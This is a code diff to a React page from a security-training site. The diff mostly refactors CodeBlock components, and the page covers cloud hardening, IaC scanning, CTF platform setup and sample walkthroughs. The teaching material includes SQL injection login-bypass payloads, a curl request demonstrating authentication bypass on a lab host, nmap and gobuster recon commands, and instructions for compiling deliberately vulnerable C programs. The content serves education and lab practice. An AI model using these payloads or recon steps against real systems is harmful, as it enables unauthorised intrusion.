                   <h4 className="text-lg font-semibold">Azure Security Center and Sentinel</h4>
                   <p>Set up monitoring and detection services in Azure:</p>
-                  <CodeBlock language="bash">{`# Enable Azure Security Center
+                  <CodeBlock language="bash"code={`# Enable Azure Security Center
 az security auto-provisioning-setting update --name default --auto-provision On
 
 # Enable Azure Defender
@@ -1483,7 +1483,7 @@ az monitor log-profiles create --name default --location global --locations glob
 # 1. Create a Log Analytics workspace
 # 2. Add Sentinel to the workspace
 # 3. Connect data sources
-# 4. Create detection rules`}</CodeBlock>
+# 4. Create detection rules`}/>
                   
                   <h4 className="text-lg font-semibold mt-4">Cloud Security Monitoring Exercises</h4>
                   <ul className="list-disc pl-6 space-y-2">
@@ -1524,7 +1524,7 @@ az monitor log-profiles create --name default --location global --locations glob
                 <div>
                   <h4 className="text-lg font-semibold">AWS CloudFormation Security</h4>
                   <p>Create and secure CloudFormation templates:</p>
-                  <CodeBlock language="yaml">{`AWSTemplateFormatVersion: '2010-09-09'
+                  <CodeBlock language="yaml"code={`AWSTemplateFormatVersion: '2010-09-09'
 Description: 'Secure VPC with private and public subnets'
 
 Resources:
@@ -1581,13 +1581,13 @@ Resources:
         BlockPublicAcls: true
         BlockPublicPolicy: true
         IgnorePublicAcls: true
-        RestrictPublicBuckets: true`}</CodeBlock>
+        RestrictPublicBuckets: true`}/>
                 </div>
                 
                 <div>
                   <h4 className="text-lg font-semibold">Terraform Security</h4>
                   <p>Create and secure Terraform configurations:</p>
-                  <CodeBlock language="hcl">{`provider "aws" {
+                  <CodeBlock language="hcl"code={`provider "aws" {
   region = "us-east-1"
 }
 
@@ -1661,13 +1661,13 @@ resource "aws_s3_bucket_public_access_block" "secure_bucket_access" {
   block_public_policy     = true
   ignore_public_acls      = true
   restrict_public_buckets = true
-}`}</CodeBlock>
+}`}/>
                 </div>
               </div>
               
               <h4 className="text-lg font-semibold mt-4">IaC Security Scanning</h4>
               <p>Set up and use tools to scan infrastructure as code for security issues:</p>
-              <CodeBlock language="bash">{`# Install and use cfn-nag for CloudFormation
+              <CodeBlock language="bash"code={`# Install and use cfn-nag for CloudFormation
 gem install cfn-nag
 cfn-nag-scan --input-path template.yaml
 
@@ -1684,7 +1684,7 @@ tfsec .
 
 # Use AWS CloudFormation Guard
 pip install cloudformation-guard
-cfn-guard validate -r rules.guard -d template.yaml`}</CodeBlock>
+cfn-guard validate -r rules.guard -d template.yaml`}/>
               
               <Alert className="mt-4">
                 <ShieldAlert className="h-4 w-4" />
@@ -1778,20 +1778,20 @@ cfn-guard validate -r rules.guard -d template.yaml`}</CodeBlock>
                   <p>Set up your own CTF platform for practice or hosting events:</p>
                   <ul className="list-disc pl-6 space-y-2">
                     <li><strong>CTFd</strong> - Popular open-source CTF platform:
-                      <CodeBlock language="bash">{`# Using Docker (recommended)
+                      <CodeBlock language="bash"code={`# Using Docker (recommended)
 git clone https://github.com/CTFd/CTFd.git
 cd CTFd
 docker-compose up -d
 
 # Access at http://localhost:8000
-# Default admin credentials: admin / password`}</CodeBlock>
+# Default admin credentials: admin / password`}/>
                     </li>
-                    <li><strong>FBCTF</strong> - Facebook's CTF platform:
-                      <CodeBlock language="bash">{`git clone https://github.com/facebook/fbctf
+                    <li><strong>FBCTF</strong> - Facebook&apos;s CTF platform:
+                      <CodeBlock language="bash"code={`git clone https://github.com/facebook/fbctf
 cd fbctf
 ./extra/provision.sh -m prod -s $PWD
 
-# Access at https://localhost`}</CodeBlock>
+# Access at https://localhost`}/>
                     </li>
                   </ul>
                 </div>
@@ -1805,10 +1805,10 @@ cd fbctf
                         <li>Create vulnerable web apps with specific flaws</li>
                         <li>Use Docker to containerize challenges</li>
                         <li>Example Dockerfile for a PHP web challenge:
-                          <CodeBlock language="dockerfile">{`FROM php:7.4-apache
+                          <CodeBlock language="dockerfile"code={`FROM php:7.4-apache
 COPY ./src/ /var/www/html/
 RUN chmod -R 755 /var/www/html/
-EXPOSE 80`}</CodeBlock>
+EXPOSE 80`}/>
                         </li>
                       </ul>
                     </li>
@@ -1816,7 +1816,7 @@ EXPOSE 80`}</CodeBlock>
                       <ul className="list-disc pl-6">
                         <li>Create vulnerable C/C++ programs</li>
                         <li>Compile with specific protections disabled:
-                          <CodeBlock language="bash">{`gcc -fno-stack-protector -no-pie -o vuln vuln.c`}</CodeBlock>
+                          <CodeBlock language="bash"code={`gcc -fno-stack-protector -no-pie -o vuln vuln.c`}/>
                         </li>
                       </ul>
                     </li>
@@ -1832,7 +1832,7 @@ EXPOSE 80`}</CodeBlock>
               
               <h4 className="text-lg font-semibold mt-4">Sample CTF Challenge Creation</h4>
               <p>Example of creating a simple web challenge:</p>
-              <CodeBlock language="bash">{`# Create a directory for your challenge
+              <CodeBlock language="bash"code={`# Create a directory for your challenge
 mkdir -p web_challenge/src
 
 # Create a vulnerable PHP file
@@ -1897,7 +1897,7 @@ docker build -t web-challenge .
 docker run -d -p 8080:80 web-challenge
 
 echo "Challenge is running at http://localhost:8080"
-echo "Solution: Use ' OR '1'='1 as the username"`}</CodeBlock>
+echo "Solution: Use ' OR '1'='1 as the username"`}/>
             </div>
             
             <div className="space-y-4 mt-8">
@@ -1909,19 +1909,19 @@ echo "Solution: Use ' OR '1'='1 as the username"`}</CodeBlock>
                   <p>Walkthrough of a basic web exploitation challenge:</p>
                   <ol className="list-decimal pl-6 space-y-2">
                     <li>Reconnaissance:
-                      <CodeBlock language="bash">{`# Scan the target
+                      <CodeBlock language="bash"code={`# Scan the target
 nmap -sV -p- 10.10.10.10
 
 # Directory enumeration
 gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt
 
 # Check for hidden files
-gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,old`}</CodeBlock>
+gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,old`}/>
                     </li>
                     <li>Vulnerability identification:
                       <ul className="list-disc pl-6">
                         <li>Found login page at /admin</li>
-                        <li>Tested for SQL injection with <code>admin' OR '1'='1</code></li>
+                        <li>Tested for SQL injection with <code>admin&apos; OR &apos;1&apos;=&apos;1</code></li>
                         <li>Successful login reveals admin panel</li>
                       </ul>
                     </li>
@@ -1934,10 +1934,10 @@ gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -x ph
                       </ul>
                     </li>
                     <li>Flag capture:
-                      <CodeBlock language="bash">{`# Using the web shell to find the flag
+                      <CodeBlock language="bash"code={`# Using the web shell to find the flag
 ls -la /var/www
 cat /var/www/flag.txt
-# CTF{w3b_h4ck3r_pr0}`}</CodeBlock>
+# CTF{w3b_h4ck3r_pr0}`}/>
                     </li>
                   </ol>
                 </div>
@@ -1948,19 +1948,19 @@ cat /var/www/flag.txt
                   <ol className="list-decimal pl-6 space-y-2">
                     <li>Challenge description:
                       <blockquote className="border-l-4 border-gray-300 pl-4 italic">
-                        We intercepted this encrypted message: <code>Ugqg{fdhvdu_flskhu_lv_fodvvlf}</code>. 
+                        We intercepted this encrypted message: <code>Ugqg fdhvdu_flskhu_lv_fodvvlf</code>. 
                         The encryption seems pretty ancient. Can you decrypt it?
                       </blockquote>
                     </li>
                     <li>Analysis:
                       <ul className="list-disc pl-6">
-                        <li>The format looks like a flag: CTF{...}</li>
-                        <li>The "ancient" hint suggests a classical cipher</li>
+                        <li>The format looks like a flag: CTF...</li>
+                        <li>The &quot;ancient&quot; hint suggests a classical cipher</li>
                         <li>The pattern suggests a Caesar cipher or ROT</li>
                       </ul>
                     </li>
                     <li>Solution approach:
-                      <CodeBlock language="python">{`# Python script to brute force Caesar cipher
+                      <CodeBlock language="python"code={`# Python script to brute force Caesar cipher
 encrypted = "Ugqg{fdhvdu_flskhu_lv_fodvvlf}"
 
 for shift in range(26):
@@ -1971,13 +1971,13 @@ for shift in range(26):
             decrypted += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)
         else:
             decrypted += char
-    print(f"ROT-{shift}: {decrypted}")`}</CodeBlock>
+    print(f"ROT-{shift}: {decrypted}")`}/>
                     </li>
                     <li>Result:
                       <ul className="list-disc pl-6">
-                        <li>ROT-3 produces: <code>Flag{caesar_cipher_is_classic}</code></li>
+                        <li>ROT-3 produces: <code>Flag-caesar_cipher_is_classic</code></li>
                         <li>This matches the expected flag format</li>
-                        <li>The flag is <code>Flag{caesar_cipher_is_classic}</code></li>
+                        <li>The flag is <code>Flag-caesar_cipher_is_classic</code></li>
                       </ul>
                     </li>
                   </ol>
@@ -2020,7 +2020,7 @@ for shift in range(26):
                 </ul>
                 
                 <h4 className="text-lg font-semibold mt-4">Lab Documentation Template</h4>
-                <CodeBlock language="markdown">{`# Security Lab Documentation
+                <CodeBlock language="markdown"code={`# Security Lab Documentation
 
 ## Overview
 - **Lab Name**: Home Security Lab
@@ -2075,7 +2075,7 @@ for shift in range(26):
 
 ## Troubleshooting
 - Common Issues and Solutions: [details]
-- Support Resources: [details]`}</CodeBlock>
+- Support Resources: [details]`}/>
               </div>
               
               <div className="space-y-4">
@@ -2085,7 +2085,7 @@ for shift in range(26):
                 </p>
                 
                 <h4 className="text-lg font-semibold">Penetration Test Report Template</h4>
-                <CodeBlock language="markdown">{`# Penetration Test Report
+                <CodeBlock language="markdown"code={`# Penetration Test Report
 
 ## Executive Summary
 Brief overview of the assessment, key findings, and risk summary.
@@ -2133,7 +2133,7 @@ Analysis of the overall security posture and risk level.
 - **Tools Used**: List of tools and their versions
 - **Methodology Details**: Detailed testing methodology
 - **Evidence**: Screenshots, logs, and other evidence
-- **Remediation Verification**: Steps to verify fixes`}</CodeBlock>
+- **Remediation Verification**: Steps to verify fixes`}/>
                 
                 <h4 className="text-lg font-semibold mt-4">Documentation Tools</h4>
                 <ul className="list-disc pl-6 space-y-2">
@@ -2163,7 +2163,7 @@ Analysis of the overall security posture and risk level.
                   
                   <h4 className="text-lg font-semibold mt-4">Command Output Documentation</h4>
                   <p>Document command-line evidence effectively:</p>
-                  <CodeBlock language="bash">{`# Example of documenting command output
+                  <CodeBlock language="bash"code={`# Example of documenting command output
 # Date: 2023-06-15
 # System: kali.lab.local (10.0.2.10)
 # Purpose: Demonstrating SQL injection vulnerability
@@ -2185,7 +2185,7 @@ curl -X POST http://web-app-01/login.php -d "username=admin'--&password=anything
 # <
 # * Connection #0 to host web-app-01 left intact
 #
-# Analysis: The 302 redirect to admin_panel.php confirms successful authentication bypass`}</CodeBlock>
+# Analysis: The 302 redirect to admin_panel.php confirms successful authentication bypass`}/>
                 </div>
                 
                 <div>
@@ -2199,7 +2199,7 @@ curl -X POST http://web-app-01/login.php -d "username=admin'--&password=anything
                     <li><strong>Filtering</strong> - Show how logs were filtered for relevance</li>
                   </ul>
                   
-                  <CodeBlock language="bash">{`# Example of log collection documentation
+                  <CodeBlock language="bash"code={`# Example of log collection documentation
 # Date: 2023-06-15 14:30 UTC
 # System: web-app-01 (10.0.3.10)
 # Collector: Security Analyst Name
@@ -2213,7 +2213,7 @@ grep "admin'--" /var/log/apache2/access.log
 10.0.2.10 - - [15/Jun/2023:14:28:32 +0000] "POST /login.php HTTP/1.1" 302 219 "-" "curl/7.74.0"
 10.0.2.10 - - [15/Jun/2023:14:29:15 +0000] "POST /login.php HTTP/1.1" 302 219 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
 
-# Analysis: Log entries confirm the SQL injection attempts from the attack system (10.0.2.10)`}</CodeBlock>
+# Analysis: Log entries confirm the SQL injection attempts from the attack system (10.0.2.10)`}/>
                   
                   <h4 className="text-lg font-semibold mt-4">Network Traffic Documentation</h4>
                   <p>Document network evidence effectively:</p>
@@ -2255,7 +2255,7 @@ grep "admin'--" /var/log/apache2/access.log
                     <li><strong>Research Projects</strong> - Share security research findings</li>
                   </ul>
                   
-                  <CodeBlock language="markdown">{`# GitHub Repository Structure Example
+                  <CodeBlock language="markdown"code={`# GitHub Repository Structure Example
 
 /security-portfolio
   /lab-setups
@@ -2291,7 +2291,7 @@ grep "admin'--" /var/log/apache2/access.log
     pentest-report-template.md
     vulnerability-assessment-template.md
   
-  README.md  # Main portfolio overview`}</CodeBlock>
+  README.md  # Main portfolio overview`}/>
                 </div>
                 
                 <div>
@@ -2322,7 +2322,7 @@ grep "admin'--" /var/log/apache2/access.log
                     <AlertDescription>
                       Never include client data, confidential information, or details about non-public vulnerabilities
                       in your portfolio. Always anonymize and sanitize any real-world examples. Get permission before
-                      publishing anything related to work you've done for others.
+                      publishing anything related to work you&apos;ve done for others.
                     </AlertDescription>
                   </Alert>
                 </div>
